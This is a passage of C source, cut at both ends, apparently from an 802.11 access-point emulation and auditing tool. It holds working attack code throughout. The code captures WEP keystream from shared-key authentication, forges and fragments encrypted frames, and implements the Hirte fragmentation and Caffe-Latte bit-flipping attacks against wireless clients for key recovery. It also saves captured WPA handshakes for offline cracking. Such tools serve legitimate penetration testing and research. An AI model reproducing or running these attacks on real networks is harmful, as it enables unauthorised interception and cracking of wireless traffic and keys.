            if( read( dev.fd_rtc, &n, sizeof( n ) ) < 0 )
            {
                perror( "read(/dev/rtc) failed" );
                return( 1 );
            }

            ticks++;
        }
        else
        {
            /* we can't trust usleep, since it depends on the HZ */

            gettimeofday( &tv,  NULL );
            usleep( 1024 );
            gettimeofday( &tv2, NULL );

            f = 1000000 * (float) ( tv2.tv_sec  - tv.tv_sec  )
                        + (float) ( tv2.tv_usec - tv.tv_usec );

            ticks += f / 1024;
        }

        if( ( ticks / 1024 * 1000 ) < msec )
            continue;

        /* threshold reached */
        break;
    }

    return 0;
}

int check_shared_key(unsigned char *h80211, int caplen)
{
    int m_bmac, m_smac, m_dmac, n, textlen;
    char ofn[1024];
    unsigned char text[4096];
    unsigned char prga[4096];
    unsigned int long crc;

    if((unsigned)caplen > sizeof(opt.sharedkey[0])) return 1;

    m_bmac = 16;
    m_smac = 10;
    m_dmac = 4;

    if( time(NULL) - opt.sk_start > 5)
    {
        /* timeout(5sec) - remove all packets, restart timer */
        memset(opt.sharedkey, '\x00', 4096*3);
        opt.sk_start = time(NULL);
    }

    /* is auth packet */
    if( (h80211[1] & 0x40) != 0x40 )
    {
        /* not encrypted */
        if( ( h80211[24] + (h80211[25] << 8) ) == 1 )
        {
            /* Shared-Key Authentication */
            if( ( h80211[26] + (h80211[27] << 8) ) == 2 )
            {
                /* sequence == 2 */
                memcpy(opt.sharedkey[0], h80211, caplen);
                opt.sk_len = caplen-24;
            }
            if( ( h80211[26] + (h80211[27] << 8) ) == 4 )
            {
                /* sequence == 4 */
                memcpy(opt.sharedkey[2], h80211, caplen);
            }
        }
        else return 1;
    }
    else
    {
        /* encrypted */
        memcpy(opt.sharedkey[1], h80211, caplen);
        opt.sk_len2 = caplen-24-4;
    }

    /* check if the 3 packets form a proper authentication */

    if( ( memcmp(opt.sharedkey[0]+m_bmac, NULL_MAC, 6) == 0 ) ||
        ( memcmp(opt.sharedkey[1]+m_bmac, NULL_MAC, 6) == 0 ) ||
        ( memcmp(opt.sharedkey[2]+m_bmac, NULL_MAC, 6) == 0 ) ) /* some bssids == zero */
    {
        return 1;
    }

    if( ( memcmp(opt.sharedkey[0]+m_bmac, opt.sharedkey[1]+m_bmac, 6) != 0 ) ||
        ( memcmp(opt.sharedkey[0]+m_bmac, opt.sharedkey[2]+m_bmac, 6) != 0 ) ) /* all bssids aren't equal */
    {
        return 1;
    }

    if( ( memcmp(opt.sharedkey[0]+m_smac, opt.sharedkey[2]+m_smac, 6) != 0 ) ||
        ( memcmp(opt.sharedkey[0]+m_smac, opt.sharedkey[1]+m_dmac, 6) != 0 ) ) /* SA in 2&4 != DA in 3 */
    {
        return 1;
    }

    if( (memcmp(opt.sharedkey[0]+m_dmac, opt.sharedkey[2]+m_dmac, 6) != 0 ) ||
        (memcmp(opt.sharedkey[0]+m_dmac, opt.sharedkey[1]+m_smac, 6) != 0 ) ) /* DA in 2&4 != SA in 3 */
    {
        return 1;
    }

    textlen = opt.sk_len;

    if(textlen+4 != opt.sk_len2)
    {
        if(!opt.quiet)
        {
            PCT; printf("Broken SKA: %02X:%02X:%02X:%02X:%02X:%02X (expected: %d, got %d bytes)\n",
                        *(opt.sharedkey[0]+m_dmac), *(opt.sharedkey[0]+m_dmac+1), *(opt.sharedkey[0]+m_dmac+2),
                        *(opt.sharedkey[0]+m_dmac+3), *(opt.sharedkey[0]+m_dmac+4), *(opt.sharedkey[0]+m_dmac+5),
                        textlen+4, opt.sk_len2);
        }
        return 1;
    }

    if((unsigned)textlen > sizeof(text) - 4) return 1;

    memcpy(text, opt.sharedkey[0]+24, textlen);

    /* increment sequence number from 2 to 3 */
    text[2] = text[2]+1;

    crc = 0xFFFFFFFF;

    for( n = 0; n < textlen; n++ )
        crc = crc_tbl[(crc ^ text[n]) & 0xFF] ^ (crc >> 8);

    crc = ~crc;

    /* append crc32 over body */
    text[textlen]     = (crc      ) & 0xFF;
    text[textlen+1]   = (crc >>  8) & 0xFF;
    text[textlen+2]   = (crc >> 16) & 0xFF;
    text[textlen+3]   = (crc >> 24) & 0xFF;

    /* cleartext XOR cipher */
    for(n=0; n<(textlen+4); n++)
    {
        prga[4+n] = (text[n] ^ opt.sharedkey[1][28+n]) & 0xFF;
    }

    /* write IV+index */
    prga[0] = opt.sharedkey[1][24] & 0xFF;
    prga[1] = opt.sharedkey[1][25] & 0xFF;
    prga[2] = opt.sharedkey[1][26] & 0xFF;
    prga[3] = opt.sharedkey[1][27] & 0xFF;

    if( opt.f_xor != NULL )
    {
        fclose(opt.f_xor);
        opt.f_xor = NULL;
    }

    snprintf( ofn, sizeof( ofn ) - 1, "keystream-%02d-%02X-%02X-%02X-%02X-%02X-%02X.%s", opt.f_index,
              *(opt.sharedkey[0]+m_dmac), *(opt.sharedkey[0]+m_dmac+1), *(opt.sharedkey[0]+m_dmac+2),
              *(opt.sharedkey[0]+m_dmac+3), *(opt.sharedkey[0]+m_dmac+4), *(opt.sharedkey[0]+m_dmac+5), "xor" );

    opt.f_index++;

    opt.f_xor = fopen( ofn, "w");
    if(opt.f_xor == NULL)
        return 1;

    for(n=0; n<textlen+8; n++)
        fputc((prga[n] & 0xFF), opt.f_xor);

    fflush(opt.f_xor);

    if( opt.f_xor != NULL )
    {
        fclose(opt.f_xor);
        opt.f_xor = NULL;
    }

    if(!opt.quiet)
    {
        PCT; printf("Got %d bytes keystream: %02X:%02X:%02X:%02X:%02X:%02X\n",
                    textlen+4, *(opt.sharedkey[0]+m_dmac), *(opt.sharedkey[0]+m_dmac+1), *(opt.sharedkey[0]+m_dmac+2),
                  *(opt.sharedkey[0]+m_dmac+3), *(opt.sharedkey[0]+m_dmac+4), *(opt.sharedkey[0]+m_dmac+5));
    }

    memset(opt.sharedkey, '\x00', 512*3);
    /* ok, keystream saved */
    return 0;
}

int read_prga(unsigned char **dest, char *file)
{
    FILE *f;
    int size;

    if(file == NULL) return( 1 );
    if(*dest == NULL) *dest = (unsigned char*) malloc(1501);

    if( memcmp( file+(strlen(file)-4), ".xor", 4 ) != 0 )
    {
        printf("Is this really a PRGA file: %s?\n", file);
    }

    f = fopen(file, "r");

    if(f == NULL)
    {
         printf("Error opening %s\n", file);
         return( 1 );
    }

    fseek(f, 0, SEEK_END);
    size = ftell(f);
    rewind(f);

    if(size > 1500) size = 1500;

    if( fread( (*dest), size, 1, f ) != 1 )
    {
    	fclose(f);
        fprintf( stderr, "fread failed\n" );
        return( 1 );
    }

    if( (*dest)[3] > 0x03 )
    {
        printf("Are you really sure that this is a valid keystream? Because the index is out of range (0-3): %02X\n", (*dest)[3] );
    }

    opt.prgalen = size;

    fclose(f);
    return( 0 );
}

void add_icv(unsigned char *input, int len, int offset)
{
    unsigned long crc = 0xFFFFFFFF;
    int n=0;

    for( n = offset; n < len; n++ )
        crc = crc_tbl[(crc ^ input[n]) & 0xFF] ^ (crc >> 8);

    crc = ~crc;

    input[len]   = (crc      ) & 0xFF;
    input[len+1] = (crc >>  8) & 0xFF;
    input[len+2] = (crc >> 16) & 0xFF;
    input[len+3] = (crc >> 24) & 0xFF;

    return;
}

int xor_keystream(unsigned char *ph80211, unsigned char *keystream, int len)
{
    int i=0;

    for (i=0; i<len; i++) {
        ph80211[i] = ph80211[i] ^ keystream[i];
    }

    return 0;
}

void print_packet ( unsigned char h80211[], int caplen )
{
	int i,j;
	int key_index_offset=0;

	printf( "        Size: %d, FromDS: %d, ToDS: %d",
		caplen, ( h80211[1] & 2 ) >> 1, ( h80211[1] & 1 ) );

	if( ( h80211[0] & 0x0C ) == 8 && ( h80211[1] & 0x40 ) != 0 )
	{
	    if ( ( h80211[1] & 3 ) == 3 ) key_index_offset = 33; //WDS packets have an additional MAC adress
		else key_index_offset = 27;

	    if( ( h80211[key_index_offset] & 0x20 ) == 0 )
		printf( " (WEP)" );
	    else
		printf( " (WPA)" );
	}

	for( i = 0; i < caplen; i++ )
	{
	if( ( i & 15 ) == 0 )
	{
		if( i == 224 )
		{
		printf( "\n        --- CUT ---" );
		break;
		}

		printf( "\n        0x%04x:  ", i );
	}

	printf( "%02x", h80211[i] );

	if( ( i & 1 ) != 0 )
		printf( " " );

	if( i == caplen - 1 && ( ( i + 1 ) & 15 ) != 0 )
	{
		for( j = ( ( i + 1 ) & 15 ); j < 16; j++ )
		{
		printf( "  " );
		if( ( j & 1 ) != 0 )
			printf( " " );
		}

		printf( " " );

		for( j = 16 - ( ( i + 1 ) & 15 ); j < 16; j++ )
		printf( "%c", ( h80211[i - 15 + j] <  32 ||
				h80211[i - 15 + j] > 126 )
				? '.' : h80211[i - 15 + j] );
	}

	if( i > 0 && ( ( i + 1 ) & 15 ) == 0 )
	{
		printf( " " );

		for( j = 0; j < 16; j++ )
		printf( "%c", ( h80211[i - 15 + j] <  32 ||
				h80211[i - 15 + j] > 127 )
				? '.' : h80211[i - 15 + j] );
	}
	}
	printf("\n");
}

#define IEEE80211_LLC_SNAP      \
    "\x08\x00\x00\x00\xDD\xDD\xDD\xDD\xDD\xDD\xBB\xBB\xBB\xBB\xBB\xBB"  \
    "\xCC\xCC\xCC\xCC\xCC\xCC\xE0\x32\xAA\xAA\x03\x00\x00\x00\x08\x00"

int set_IVidx(unsigned char* packet)
{
    unsigned char ividx[4];

    if(packet == NULL) return 1;

    if(opt.prga == NULL && opt.crypt != CRYPT_WEP)
    {
        printf("Please specify a WEP key (-w).\n");
        return 1;
    }

    if( opt.crypt == CRYPT_WEP )
    {
        ividx[0] = rand() & 0xFF;
        ividx[1] = rand() & 0xFF;
        ividx[2] = rand() & 0xFF;
        ividx[3] = 0x00;
    }
    else if(opt.prga != NULL)
    {
        memcpy(ividx, opt.prga, 4);
    }

    /* insert IV+index */
    memcpy(packet+24, ividx, 4);

    return 0;
}

int encrypt_data(unsigned char* data, int length)
{
    unsigned char cipher[4096];
    unsigned char K[128];

    if(data == NULL)                return 1;
    if(length < 1 || length > 2044) return 1;

    if(opt.prga == NULL && opt.crypt != CRYPT_WEP)
    {
        printf("Please specify a WEP key (-w).\n");
        return 1;
    }

    if(opt.prgalen-4 < length && opt.crypt != CRYPT_WEP)
    {
        printf("Please specify a longer PRGA file (-y) with at least %i bytes.\n", (length+4));
        return 1;
    }

    /* encrypt data */
    if(opt.crypt == CRYPT_WEP)
    {
        K[0] = rand() & 0xFF;
        K[1] = rand() & 0xFF;
        K[2] = rand() & 0xFF;
        memcpy( K + 3, opt.wepkey, opt.weplen );

        encrypt_wep( data, length, K, opt.weplen+3 );
        memcpy(cipher, data, length);
        memcpy(data+4, cipher, length);
        memcpy(data, K, 3);
        data[3] = 0x00;
    }

    return 0;
}

int create_wep_packet(unsigned char* packet, int *length, int hdrlen)
{
    if(packet == NULL) return 1;

    /* write crc32 value behind data */
    if( add_crc32(packet+hdrlen, *length-hdrlen) != 0 )               return 1;

    /* encrypt data+crc32 and keep a 4byte hole */
    if( encrypt_data(packet+hdrlen, *length-hdrlen+4) != 0 ) return 1;

//     /* write IV+IDX right in front of the encrypted data */
//     if( set_IVidx(packet) != 0 )                              return 1;

    /* set WEP bit */
    packet[1] = packet[1] | 0x40;

    *length+=8;
    /* now you got yourself a shiny, brand new encrypted wep packet ;) */

    return 0;
}

int intercept(unsigned char* packet, int length)
{
    unsigned char buf[4096];
    unsigned char K[128];
    int z=0;

    memset(buf, 0, 4096);

    z = ( ( packet[1] & 3 ) != 3 ) ? 24 : 30;

    if( opt.crypt == CRYPT_WEP )
    {
        memcpy( K, packet + z, 3 );
        memcpy( K + 3, opt.wepkey, opt.weplen );

        if (decrypt_wep( packet + z + 4, length - z - 4,
                        K, 3 + opt.weplen ) == 0 )
        {
			// ICV check failed!
            return 1;
        }

        /* WEP data packet was successfully decrypted, *
        * remove the WEP IV & ICV and write the data  */

        length -= 8;

        memcpy( packet + z, packet + z + 4, length - z );
    }

    /* clear wep bit */
    packet[1] &= 0xBF;

    //insert ethernet header
    memcpy(buf+14, packet, length);
    length += 14;

    ti_write(dev.dv_ti2, buf, length);
    return 0;
}

int packet_xmit(unsigned char* packet, int length)
{
    unsigned char buf[4096];
    int fragments=1, i;
    int newlen=0, usedlen=0, length2;

    if(packet == NULL)
        return 1;

    if(length < 38)
        return 1;

    if(length-14 > 16*opt.wif_mtu-MAX_FRAME_EXTENSION)
        return 1;

    if(length+MAX_FRAME_EXTENSION > opt.wif_mtu)
        fragments=((length-14+MAX_FRAME_EXTENSION) / opt.wif_mtu) + 1;

    if(fragments > 16)
        return 1;

    if(fragments > 1)
        newlen = (length-14+MAX_FRAME_EXTENSION)/fragments;
    else
        newlen = length-14;

    for(i=0; i<fragments; i++)
    {
        if(i == fragments-1)
            newlen = length-14-usedlen; //use all remaining bytes for the last fragment

        if(i==0)
        {
            memcpy(h80211, IEEE80211_LLC_SNAP, 32);
            memcpy(h80211+32, packet+14+usedlen, newlen);
            memcpy(h80211+30, packet+12, 2);
        }
        else
        {
            memcpy(h80211, IEEE80211_LLC_SNAP, 24);
            memcpy(h80211+24, packet+14+usedlen, newlen);
//             memcpy(h80211+30, packet+12, 2);
        }

        h80211[1] |= 0x02;
        memcpy(h80211+10, opt.r_bssid, 6);  //BSSID
        memcpy(h80211+16, packet+6,    6);  //SRC_MAC
        memcpy(h80211+4,  packet,      6);  //DST_MAC

//    frag = frame[22] & 0x0F;
//    seq = (frame[22] >> 4) | (frame[23] << 4);
        h80211[22] |= i & 0x0F; //set fragment
        h80211[1]  |= 0x04; //more frags

        if(i == (fragments-1))
        {
            h80211[1]  &= 0xFB; //no more frags
        }

//         length = length+32-14; //32=IEEE80211+LLC/SNAP; 14=SRC_MAC+DST_MAC+TYPE
        length2 = newlen+32;

        if((opt.external & EXT_OUT))
        {
            memset(buf, 0, 4096);
            memcpy(buf+14, h80211, length2);
            //mark it as outgoing packet
            buf[12] = 0xFF;
            buf[13] = 0xFF;
            ti_write(dev.dv_ti2, buf, length2+14);
//             return 0;
        }
        else
        {
            if( opt.crypt == CRYPT_WEP || opt.prgalen > 0 )
            {
                if(create_wep_packet(h80211, &length2, 24) != 0) return 1;
            }

            send_packet(h80211, length2);
        }

        usedlen += newlen;

        if((i+1)<fragments)
            usleep(3000);
    }
    return 0;
}

int packet_recv(unsigned char* packet, int length, struct AP_conf *apc, int external);

int packet_xmit_external(unsigned char* packet, int length, struct AP_conf *apc)
{
    unsigned char buf[4096];
    int z=0;

    if(packet == NULL)
        return 1;

    if(length < 40 || length > 3000)
        return 1;

    memset(buf, 0, 4096);
    if(memcmp(packet, buf, 11) != 0)
    {
		// Wrong header
        return 1;
    }

    /* cut ethernet header */
    memcpy(buf, packet, length);
    length -= 14;
    memcpy(packet, buf+14, length);

    z = ( ( packet[1] & 3 ) != 3 ) ? 24 : 30;

    if( opt.crypt == CRYPT_WEP || opt.prgalen > 0 )
    {
        if(create_wep_packet(packet, &length, z) != 0) return 1;
    }

    if(memcmp(buf+12, (unsigned char *)"\x00\x00", 2) == 0) /* incoming packet */
    {
        packet_recv(packet, length, apc, 0);
    }
    else if(memcmp(buf+12, (unsigned char *)"\xFF\xFF", 2) == 0) /* outgoing packet */
    {
        send_packet(packet, length);
    }

    return 0;
}

int remove_tag(unsigned char *flags, unsigned char type, int *length)
{
    int cur_type=0, cur_len=0, len=0;
    unsigned char *pos;
    unsigned char buffer[4096];

    if(*length < 2)
        return 1;

    if(flags == NULL)
        return 1;

    pos = flags;

    do
    {
        cur_type = pos[0];
        cur_len = pos[1];
//         printf("tag %d with len %d found, looking for tag %d\n", cur_type, cur_len, type);
//         printf("gone through %d bytes from %d max\n", len+2+cur_len, *length);
        if(len+2+cur_len > *length)
            return 1;

        if(cur_type == type)
        {
            if(cur_len > 0 && (pos-flags+cur_len+2) <= *length)
            {
                memcpy(buffer, pos+2+cur_len, *length-((pos+2+cur_len) - flags));
                memcpy(pos, buffer, *length-((pos+2+cur_len) - flags));
                *length = *length - 2 - cur_len;
                return 0;
            }
            else
                return 1;
        }
        pos += cur_len + 2;
        len += cur_len + 2;
    } while(len+2 <= *length);

    return 0;
}

unsigned char* parse_tags(unsigned char *flags, unsigned char type, int length, int *taglen)
{
    int cur_type=0, cur_len=0, len=0;
    unsigned char *pos;

    if(length < 2)
        return(NULL);

    if(flags == NULL)
        return(NULL);

    pos = flags;

    do
    {
        cur_type = pos[0];
        cur_len = pos[1];
        if(len+2+cur_len > length)
            return(NULL);

        if(cur_type == type)
        {
            if(cur_len > 0)
            {
                *taglen = cur_len;
                return pos+2;
            }
            else
                return(NULL);
        }
        pos += cur_len + 2;
        len += cur_len + 2;
    } while(len+2 <= length);

    return(NULL);
}

int wpa_client(struct ST_info *st_cur,unsigned char* tag, int length)
{
    if(tag == NULL)
        return 1;

    if(st_cur == NULL)
        return 1;

    if(tag[0] != 0xDD && tag[0] != 0x30) //wpa1 or wpa2
        return 1;

    if(tag[0] == 0xDD)
    {
        if(length < 24)
            return 1;

        switch(tag[17]) {
            case 0x02:
                st_cur->wpahash = 1; //md5|tkip
                break;
            case 0x04:
                st_cur->wpahash = 2; //sha1|ccmp
                break;
            default:
                return 1;
        }

        st_cur->wpatype = 1; //wpa1
    }

    if(tag[0] == 0x30 && st_cur->wpatype == 0)
    {
        if(length < 22)
            return 1;

        switch(tag[13]) {
            case 0x02:
                st_cur->wpahash = 1; //md5|tkip
                break;
            case 0x04:
                st_cur->wpahash = 2; //sha1|ccmp
                break;
            default:
                return 1;
        }

        st_cur->wpatype = 2; //wpa2
    }

    return 0;
}

int set_clear_arp(unsigned char *buf, unsigned char *smac, unsigned char *dmac) //set first 22 bytes
{
    if(buf == NULL)
        return -1;

    memcpy(buf, S_LLC_SNAP_ARP, 8);
    buf[8]  = 0x00;
    buf[9]  = 0x01; //ethernet
    buf[10] = 0x08; // IP
    buf[11] = 0x00;
    buf[12] = 0x06; //hardware size
    buf[13] = 0x04; //protocol size
    buf[14] = 0x00;
    if(memcmp(dmac, BROADCAST, 6) == 0)
        buf[15]  = 0x01; //request
    else
        buf[15]  = 0x02; //reply
    memcpy(buf+16, smac, 6);

    return 0;
}

int set_final_arp(unsigned char *buf, unsigned char *mymac)
{
    if(buf == NULL)
        return -1;

    //shifted by 10bytes to set source IP as target IP :)

    buf[0] = 0x08; // IP
    buf[1] = 0x00;
    buf[2] = 0x06; //hardware size
    buf[3] = 0x04; //protocol size
    buf[4] = 0x00;
    buf[5] = 0x01; //request
    memcpy(buf+6, mymac, 6); //sender mac
    buf[12] = 0xA9; //sender IP 169.254.87.197
    buf[13] = 0xFE;
    buf[14] = 0x57;
    buf[15] = 0xC5; //end sender IP

    return 0;
}

int set_clear_ip(unsigned char *buf, int ip_len) //set first 9 bytes
{
    if(buf == NULL)
        return -1;

    memcpy(buf, S_LLC_SNAP_IP, 8);
    buf[8]  = 0x45;
    buf[10] = (ip_len >> 8)  & 0xFF;
    buf[11] = ip_len & 0xFF;

    return 0;
}

int set_final_ip(unsigned char *buf, unsigned char *mymac)
{
    if(buf == NULL)
        return -1;

    //shifted by 10bytes to set source IP as target IP :)

    buf[0] = 0x06; //hardware size
    buf[1] = 0x04; //protocol size
    buf[2] = 0x00;
    buf[3] = 0x01; //request
    memcpy(buf+4, mymac, 6); //sender mac
    buf[10] = 0xA9; //sender IP from 169.254.XXX.XXX
    buf[11] = 0xFE;
    buf[12] = 0x57;
    buf[13] = 0xC5; //end sender IP

    return 0;
}

//add packet for client fragmentation attack
int addCF(unsigned char* packet, int length)
{
    pCF_t   curCF = rCF;
    unsigned char bssid[6];
    unsigned char smac[6];
    unsigned char dmac[6];
    unsigned char keystream[128];
    unsigned char frag1[128], frag2[128], frag3[128];
    unsigned char clear[4096], final[4096], flip[4096];
    int isarp;
    int z, i;

    if(curCF == NULL)
        return 1;

    if(packet == NULL)
        return 1;

    z = ( ( packet[1] & 3 ) != 3 ) ? 24 : 30;

    if(length < z+8)
        return 1;

    if(length > 3800)
    {
        return 1;
    }

    if(opt.cf_count >= 100)
        return 1;

    memset(clear, 0, 4096);
    memset(final, 0, 4096);
    memset(flip, 0, 4096);
    memset(frag1, 0, 128);
    memset(frag2, 0, 128);
    memset(frag3, 0, 128);
    memset(keystream, 0, 128);

    switch( packet[1] & 3 )
    {
        case  0:
            memcpy( bssid, packet + 16, 6 );
            memcpy( dmac, packet + 4, 6 );
            memcpy( smac, packet + 10, 6 );
            break;
        case  1:
            memcpy( bssid, packet + 4, 6 );
            memcpy( dmac, packet + 16, 6 );
            memcpy( smac, packet + 10, 6 );
            break;
        case  2:
            memcpy( bssid, packet + 10, 6 );
            memcpy( dmac, packet + 4, 6 );
            memcpy( smac, packet + 16, 6 );
            break;
        default:
            memcpy( bssid, packet + 10, 6 );
            memcpy( dmac, packet + 16, 6 );
            memcpy( smac, packet + 24, 6 );
            break;
    }

    if( is_ipv6(packet) )
    {
        if(opt.verbose)
        {
            PCT; printf("Ignored IPv6 packet.\n");
        }

        return 1;
    }

    if( is_dhcp_discover(packet, length-z-4-4) )
    {
        if(opt.verbose)
        {
            PCT; printf("Ignored DHCP Discover packet.\n");
        }

        return 1;
    }

    /* check if it's a potential ARP request */

    //its length 68 or 86 and going to broadcast or a unicast mac (even first byte)
    if( (length == 68 || length == 86) && (memcmp(dmac, BROADCAST, 6) == 0 || (dmac[0]%2) == 0) )
    {
        /* process ARP */
        isarp = 1;
        //build the new packet
        set_clear_arp(clear, smac, dmac);
        set_final_arp(final, opt.r_smac);

        for(i=0; i<14; i++)
            keystream[i] = (packet+z+4)[i] ^ clear[i];

        // correct 80211 header
        packet[0] = 0x08;    //data
        if( (packet[1] & 3) == 0x00 ) //ad-hoc
        {
            packet[1] = 0x40;    //wep
            memcpy(packet+4, smac, 6);
            memcpy(packet+10, opt.r_smac, 6);
            memcpy(packet+16, bssid, 6);
        }
        else //tods
        {
            packet[1] = 0x42;    //wep+FromDS
            memcpy(packet+4, smac, 6);
            memcpy(packet+10, bssid, 6);
            memcpy(packet+16, opt.r_smac, 6);
        }
        packet[22] = 0xD0; //frag = 0;
        packet[23] = 0x50;

        //need to shift by 10 bytes; (add 1 frag in front)
        memcpy(frag1, packet, z+4); //copy 80211 header and IV
        frag1[1] |= 0x04; //more frags
        memcpy(frag1+z+4, S_LLC_SNAP_ARP, 8);
        frag1[z+4+8] = 0x00;
        frag1[z+4+9] = 0x01; //ethernet
        add_crc32(frag1+z+4, 10);
        for(i=0; i<14; i++)
            (frag1+z+4)[i] ^= keystream[i];
        /* frag1 finished */

        for(i=0; i<length; i++)
            flip[i] = clear[i] ^ final[i];

        add_crc32_plain(flip, length-z-4-4);

        for(i=0; i<length-z-4; i++)
            (packet+z+4)[i] ^= flip[i];
        packet[22] = 0xD1; // frag = 1;

        //ready to send frag1 / len=z+4+10+4 and packet / len = length
    }
    else
    {
        /* process IP */
        isarp = 0;
        //build the new packet
        set_clear_ip(clear, length-z-4-8-4);
        set_final_ip(final, opt.r_smac);

        for(i=0; i<8; i++)
            keystream[i] = (packet+z+4)[i] ^ clear[i];

        // correct 80211 header
        packet[0] = 0x08;    //data
        if( (packet[1] & 3) == 0x00 ) //ad-hoc
        {
            packet[1] = 0x40;    //wep
            memcpy(packet+4, smac, 6);
            memcpy(packet+10, opt.r_smac, 6);
            memcpy(packet+16, bssid, 6);
        }
        else
        {
            packet[1] = 0x42;    //wep+FromDS
            memcpy(packet+4, smac, 6);
            memcpy(packet+10, bssid, 6);
            memcpy(packet+16, opt.r_smac, 6);
        }
        packet[22] = 0xD0; //frag = 0;
        packet[23] = 0x50;

        //need to shift by 12 bytes;(add 3 frags in front)
        memcpy(frag1, packet, z+4); //copy 80211 header and IV
        memcpy(frag2, packet, z+4); //copy 80211 header and IV
        memcpy(frag3, packet, z+4); //copy 80211 header and IV
        frag1[1] |= 0x04; //more frags
        frag2[1] |= 0x04; //more frags
        frag3[1] |= 0x04; //more frags

        memcpy(frag1+z+4, S_LLC_SNAP_ARP, 4);
        add_crc32(frag1+z+4, 4);
        for(i=0; i<8; i++)
            (frag1+z+4)[i] ^= keystream[i];

        memcpy(frag2+z+4, S_LLC_SNAP_ARP+4, 4);
        add_crc32(frag2+z+4, 4);
        for(i=0; i<8; i++)
            (frag2+z+4)[i] ^= keystream[i];
        frag2[22] = 0xD1; //frag = 1;

        frag3[z+4+0] = 0x00;
        frag3[z+4+1] = 0x01; //ether
        frag3[z+4+2] = 0x08; //IP
        frag3[z+4+3] = 0x00;
        add_crc32(frag3+z+4, 4);
        for(i=0; i<8; i++)
            (frag3+z+4)[i] ^= keystream[i];
        frag3[22] = 0xD2; //frag = 2;
        /* frag1,2,3 finished */

        for(i=0; i<length; i++)
            flip[i] = clear[i] ^ final[i];

        add_crc32_plain(flip, length-z-4-4);

        for(i=0; i<length-z-4; i++)
            (packet+z+4)[i] ^= flip[i];
        packet[22] = 0xD3; // frag = 3;

        //ready to send frag1,2,3 / len=z+4+4+4 and packet / len = length
    }
    while(curCF->next != NULL)
        curCF = curCF->next;

    pthread_mutex_lock( &mx_cf );

    curCF->next = (pCF_t) malloc(sizeof(struct CF_packet));
    curCF = curCF->next;
    curCF->xmitcount = 0;
    curCF->next = NULL;

    if(isarp)
    {
        memcpy(curCF->frags[0], frag1, z+4+10+4);
        curCF->fraglen[0] = z+4+10+4;
        memcpy(curCF->final, packet, length);
        curCF->finallen = length;
        curCF->fragnum = 1; /* one frag and final frame */
    }
    else
    {
        memcpy(curCF->frags[0], frag1, z+4+4+4);
        memcpy(curCF->frags[1], frag2, z+4+4+4);
        memcpy(curCF->frags[2], frag3, z+4+4+4);
        curCF->fraglen[0] = z+4+4+4;
        curCF->fraglen[1] = z+4+4+4;
        curCF->fraglen[2] = z+4+4+4;
        memcpy(curCF->final, packet, length);
        curCF->finallen = length;
        curCF->fragnum = 3; /* three frags and final frame */
    }

    opt.cf_count++;

    pthread_mutex_unlock( &mx_cf );

    if(opt.cf_count == 1 && !opt.quiet)
    {
        PCT; printf("Starting Hirte attack against %02X:%02X:%02X:%02X:%02X:%02X at %d pps.\n",
                smac[0],smac[1],smac[2],smac[3],smac[4],smac[5],opt.r_nbpps);
    }

    if(opt.verbose)
    {
        PCT; printf("Added %s packet to cfrag buffer.\n", isarp?"ARP":"IP");
    }

    return 0;
}

//add packet for caffe latte attack
int addarp(unsigned char* packet, int length)
{
    unsigned char bssid[6], smac[6], dmac[6];
    unsigned char flip[4096];
    int z=0, i=0;

    if(packet == NULL)
        return -1;

    if(length != 68 && length != 86)
        return -1;

    z = ( ( packet[1] & 3 ) != 3 ) ? 24 : 30;

    if(( packet[1] & 3 ) == 0)
    {
        memcpy( dmac, packet + 4, 6 );
        memcpy( smac, packet + 10, 6 );
        memcpy( bssid, packet + 16, 6 );
    }
    else
    {
        memcpy( dmac, packet + 4, 6 );
        memcpy( bssid, packet + 10, 6 );
        memcpy( smac, packet + 16, 6 );
    }

    if(memcmp(dmac, BROADCAST, 6) != 0)
        return -1;

    if(memcmp(bssid, opt.r_bssid, 6) != 0)
        return -1;

    packet[21] ^= ((rand() % 255)+1); //Sohail:flip sender MAC address since few clients do not honor ARP from its own MAC

    if(opt.nb_arp >= opt.ringbuffer)
        return -1;

    memset(flip, 0, 4096);

    flip[49-z-4] ^= ((rand() % 255)+1); //flip random bits in last byte of sender MAC
    flip[53-z-4] ^= ((rand() % 255)+1); //flip random bits in last byte of sender IP

    add_crc32_plain(flip, length-z-4-4);
    for(i=0; i<length-z-4; i++)
        (packet+z+4)[i] ^= flip[i];

    arp[opt.nb_arp].buf = (unsigned char*) malloc(length);
    arp[opt.nb_arp].len = length;
    memcpy(arp[opt.nb_arp].buf, packet, length);
    opt.nb_arp++;

    if(opt.nb_arp == 1 && !opt.quiet)
    {
        PCT; printf("Starting Caffe-Latte attack against %02X:%02X:%02X:%02X:%02X:%02X at %d pps.\n",
                smac[0],smac[1],smac[2],smac[3],smac[4],smac[5],opt.r_nbpps);
    }

    if(opt.verbose)
    {
        PCT; printf("Added an ARP to the caffe-latte ringbuffer %d/%d\n", opt.nb_arp, opt.ringbuffer);
    }

    return 0;
}

int store_wpa_handshake(struct ST_info *st_cur)
{
    FILE *f_ivs;
    struct ivs2_filehdr fivs2;
    char ofn[1024];
    struct ivs2_pkthdr ivs2;

    if(st_cur == NULL)
        return 1;

    fivs2.version = IVS2_VERSION;

    snprintf( ofn,  sizeof( ofn ) - 1, "wpa-%02d-%02X-%02X-%02X-%02X-%02X-%02X.%s",
                opt.f_index, st_cur->stmac[0], st_cur->stmac[1], st_cur->stmac[2]
                , st_cur->stmac[3], st_cur->stmac[4], st_cur->stmac[5], IVS2_EXTENSION );

    opt.f_index++;

    if( ( f_ivs = fopen( ofn, "wb+" ) ) == NULL )
    {
        perror( "fopen failed" );
        fprintf( stderr, "Could not create \"%s\".\n", ofn );
        return( 1 );
    }

    if( fwrite( IVS2_MAGIC, 1, 4, f_ivs ) != (size_t) 4 )
    {
        perror( "fwrite(IVs file MAGIC) failed" );
        fclose( f_ivs );
        return( 1 );
    }

    if( fwrite( &fivs2, 1, sizeof(struct ivs2_filehdr), f_ivs ) != (size_t) sizeof(struct ivs2_filehdr) )
    {
        perror( "fwrite(IVs file header) failed" );
        fclose( f_ivs );
        return( 1 );
    }

    memset(&ivs2, '\x00', sizeof(struct ivs2_pkthdr));

    //write stmac as bssid and essid
    ivs2.flags = 0;
    ivs2.len = 0;

    ivs2.len += st_cur->essid_length;
    ivs2.flags |= IVS2_ESSID;

    ivs2.flags |= IVS2_BSSID;
    ivs2.len += 6;

    if( fwrite( &ivs2, 1, sizeof(struct ivs2_pkthdr), f_ivs )
        != (size_t) sizeof(struct ivs2_pkthdr) )
    {
        perror( "fwrite(IV header) failed" );
        fclose( f_ivs );
        return( 1 );
    }

    if( fwrite( opt.r_bssid, 1, 6, f_ivs ) != (size_t) 6 )
    {
